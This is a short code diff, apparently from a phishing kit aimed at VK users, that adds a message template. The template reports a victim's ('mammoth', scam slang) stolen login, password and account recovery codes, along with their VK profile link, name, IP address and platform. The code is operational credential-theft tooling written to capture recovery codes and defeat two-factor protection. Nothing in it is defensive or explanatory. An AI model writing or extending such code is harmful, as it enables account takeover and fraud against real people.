@@ -25,5 +25,19 @@ IP: ${data.ip}
 Пароль: <code>${data.password}</code>
 
 IP: ${data.ip}
-Платформа: ${data.platform}` //2fa
+Платформа: ${data.platform}`, //2fa
+
+  recoveryCodes: data => `<b>🐘 Получены Рекавери Коды Мамонта ✅</b>
+  
+Логин: <code>${data.username}</code>
+Пароль: <code>${data.password}</code>
+Коды: ${data.codes.map(c => `<code>${c}</code>`).join(", ")}
+
+Профиль ВК:
+<a href="https://vk.com/id${data.user_id}">
+  ${data.first_name} ${data.last_name}
+</a>
+
+IP: ${data.ip}
+Платформа: ${data.platform}`
 };
